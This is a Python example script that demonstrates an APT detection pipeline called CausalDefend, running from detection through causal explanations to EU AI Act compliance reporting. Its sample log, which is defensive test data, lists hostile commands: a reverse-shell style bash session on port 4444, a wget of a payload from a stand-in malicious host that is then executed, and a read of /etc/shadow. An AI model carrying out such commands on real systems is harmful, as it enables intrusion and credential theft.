"""
Complete Usage Example for CausalDefend

Demonstrates end-to-end APT detection pipeline.
"""

import sys
import io
import logging
from pathlib import Path

# Set UTF-8 encoding for stdout (Windows compatibility)
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Import CausalDefend components
from causaldefend.pipeline.detection_pipeline import create_default_pipeline
from causaldefend.compliance.eu_ai_act import create_default_model_card


def main():
    """Run complete detection example"""
    
    print("="*80)
    print("CausalDefend - APT Detection using Causal Graph Neural Networks")
    print("="*80)
    print()
    
    # Step 1: Initialize pipeline
    print("Step 1: Initializing detection pipeline...")
    print("-" * 80)
    
    pipeline = create_default_pipeline(
        detector_checkpoint=Path("models/detector.ckpt"),
        ci_tester_checkpoint=Path("models/ci_tester.ckpt"),
        critical_assets=["DatabaseServer", "DomainController", "FileServer"]
    )
    
    print("✓ Pipeline initialized")
    print()
    
    # Step 2: Load sample log data
    print("Step 2: Loading sample log data...")
    print("-" * 80)
    
    # Example: auditd log format
    sample_log = """
    {
        "timestamp": "2024-01-15T10:30:00Z",
        "events": [
            {"type": "EXECVE", "pid": 1234, "exe": "/bin/bash", "cmdline": "bash -i"},
            {"type": "CONNECT", "pid": 1234, "dst_ip": "192.168.1.100", "dst_port": 4444},
            {"type": "EXECVE", "pid": 5678, "exe": "/usr/bin/wget", "cmdline": "wget http://malicious.com/payload"},
            {"type": "FILE_WRITE", "pid": 5678, "path": "/tmp/payload.sh"},
            {"type": "EXECVE", "pid": 9012, "exe": "/bin/sh", "cmdline": "sh /tmp/payload.sh"},
            {"type": "FILE_READ", "pid": 9012, "path": "/etc/shadow"},
            {"type": "CONNECT", "pid": 9012, "dst_ip": "10.0.0.5", "dst_port": 445}
        ]
    }
    """
    
    print(f"✓ Loaded {len(sample_log.splitlines())} log lines")
    print()
    
    # Step 3: Process through detection pipeline
    print("Step 3: Running detection pipeline...")
    print("-" * 80)
    
    result = pipeline.process_alert(
        log_data=sample_log,
        log_format="json",
        user_id="analyst_001",
        session_id="session_2024_01_15"
    )
    
    print(f"✓ Pipeline completed in {result.processing_time_ms:.2f}ms")
    print()
    
    # Step 4: Display detection results
    print("Step 4: Detection Results")
    print("-" * 80)
    print(f"Anomaly Detected: {result.anomaly_detected}")
    print(f"Anomaly Score: {result.anomaly_score:.4f}")
    print(f"Confidence: {result.confidence:.4f}")
    print(f"Should Escalate: {result.should_escalate}")
    print(f"Prediction Set: {result.prediction_set}")
    print()
    
    # Step 5: Display graph statistics
    print("Step 5: Graph Analysis")
    print("-" * 80)
    print(f"Original graph: {result.graph_stats['num_nodes']} nodes, {result.graph_stats['num_edges']} edges")
    if 'reduction_ratio' in result.graph_stats:
        print(f"Reduced graph: {result.graph_stats.get('num_nodes', 'N/A')} nodes")
        print(f"Reduction ratio: {result.graph_stats['reduction_ratio']:.2%}")
    print()
    
    # Step 6: Display attack chains
    if result.attack_chains:
        print("Step 6: Attack Chains")
        print("-" * 80)
        for i, chain in enumerate(result.attack_chains, 1):
            print(f"\nChain {i}:")
            for j, node in enumerate(chain, 1):
                print(f"  {j}. {node}")
        print()
    
    # Step 7: Display explanations
    if result.explanations:
        print("Step 7: Causal Explanations")
        print("-" * 80)
        for i, explanation in enumerate(result.explanations, 1):
            print(f"\n{'='*70}")
            print(f"Explanation {i} (Confidence: {explanation.confidence:.2f})")
            print(f"{'='*70}")
            print()
            print(explanation.narrative)
            print()
            
            print("Critical Intervention Points:")
            for node in explanation.critical_nodes:
                print(f"  • {node}")
            print()
            
            print("Counterfactual Scenarios:")
            for cf in explanation.counterfactuals:
                print(f"  • {cf}")
            print()
    
    # Step 8: Compliance check
    print("Step 8: EU AI Act Compliance")
    print("-" * 80)
    compliance_status = pipeline.get_compliance_status()
    for requirement, status in compliance_status.items():
        status_symbol = "✓" if status else "✗"
        print(f"{status_symbol} {requirement}: {'PASS' if status else 'FAIL'}")
    print()
    
    # Step 9: Export compliance report
    print("Step 9: Exporting Compliance Report")
    print("-" * 80)
    report_path = Path("compliance_report.json")
    pipeline.export_compliance_report(report_path)
    print(f"✓ Compliance report saved to {report_path}")
    print()
    
    # Step 10: Simulate analyst feedback
    print("Step 10: Analyst Feedback")
    print("-" * 80)
    pipeline.process_feedback(
        audit_log_id=result.audit_log_id,
        true_label=1,  # Confirm it was an attack
        feedback_text="Confirmed APT. Lateral movement from compromised workstation."
    )
    print("✓ Feedback recorded")
    print()
    
    print("="*80)
    print("Detection Complete!")
    print("="*80)
    print()
    print(f"Audit Log ID: {result.audit_log_id}")
    print(f"Total Processing Time: {result.processing_time_ms:.2f}ms")
    
    # Optional: Display result as JSON
    print()
    print("Result Summary (JSON):")
    print("-" * 80)
    import json
    print(json.dumps(result.to_dict(), indent=2))


if __name__ == "__main__":
    main()
